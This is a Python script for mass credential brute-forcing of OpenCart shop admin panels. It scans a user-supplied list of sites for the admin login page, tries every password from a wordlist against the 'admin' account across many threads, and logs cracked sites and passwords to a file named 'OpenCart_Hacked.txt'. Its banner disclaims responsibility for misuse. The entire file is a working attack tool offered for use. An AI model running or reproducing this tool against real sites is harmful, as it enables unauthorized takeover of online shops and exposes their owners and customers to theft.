import requests,os
os.system(['clear', 'cls'][(os.name == 'nt')])
try:
	import concurrent.futures
	xxx = True
except:
	from multiprocessing.pool import ThreadPool
	xxx = False
headers= {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
try:
	passlist = open("passwords.txt","r").read().splitlines()
except:
	print(" passwords.txt file missing!")
	exit()
print(r+"""   _____       _       _         _ _      __ ____ ____ ______ 
  / ____|     | |     | |       | (_)    /_ |___ \___ \____  |
 | (___   __ _| | __ _| |__   __| |_ _ __ | | __) |__) |  / / 
  \___ \ / _` | |/ _` | '_ \ / _` | | '_ \| ||__ <|__ <  / /  
  ____) | (_| | | (_| | | | | (_| | | | | | |___) |__) |/ /   
 |_____/ \__,_|_|\__,_|_| |_|\__,_|_|_| |_|_|____/____//_/                                                              \n    I Don't Aspect Any Responsibility For Bad Ussage!
 """)
def opencart(site, passwd):
	try:
		data = {'username': 'admin','password': passwd}
		url = "http://" + site + "/admin/index.php?route=common/login"
		sess = requests.session()
		sent = sess.post(url, data=data,headers=headers, timeout=10)
		print(r+" [+] Opencart: "+site+" | admin | "+passwd+" |")
		if 'user_token=' in str(sent.content) or 'token=' in str(sent.content):
			print(g+" [+] Cracked: "+site+" | admin | "+passwd+" |")
			try:
				open('OpenCart_Hacked.txt', 'a').write('http://' + site + '/admin/index.php' + '\n Username: admin' + '\n Password: ' +passwd + '\n-----------------------------------------\n')
			except:
				pass
			return "1"
	except:
		pass            
def check(url):
	url = url.strip()
	try:
		check = requests.get("http://"+url+"/admin/index.php",timeout=10, headers=headers).content
		if 'getURLVar(key)' in str(check) or 'admin/index.php?route=common/login' in str(check):
	        	print(g+" [+] Opencart: "+w+url+" --> "+y+"Detected!")
	        	try:
	        		open("opencart.txt","a").write(url + '\n')
	        	except Exception as e:
	        		print(e)
	        	for passw in passlist:
	        		x = opencart(url,passw)
	        		if x == "1":
	        			break
		else:
			print(w+" [+] Unknown: "+r+url)
	except Exception as e:
		pass
try:
	try:
		Target = raw_input(g+" [+] Enter Your List: "+r)
	except:
		Target = input(g+' [+] Enter Your List: '+r)
	list = open(Target, 'r').read().splitlines()
	th = input(g+" [+] How Many Thread: "+r)
except Exception as e:
	print(str(e))
if xxx == True:
	try:
		with concurrent.futures.ThreadPoolExecutor(int(th)) as executor:
			executor.map(check,list)
	except Exception as e:
		print(e)
else:
	pool = ThreadPool(100)
	pool.map(check,list)
	pool.close()
	pool.join()